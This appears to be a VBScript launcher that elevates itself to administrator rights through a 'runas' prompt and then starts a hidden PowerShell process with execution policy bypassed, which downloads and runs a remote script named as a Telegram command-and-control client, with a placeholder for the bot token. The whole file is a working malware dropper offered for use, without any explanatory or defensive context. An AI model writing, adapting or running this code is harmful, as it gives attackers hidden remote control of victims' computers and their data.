Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200

If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigew0rm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex", 0, True
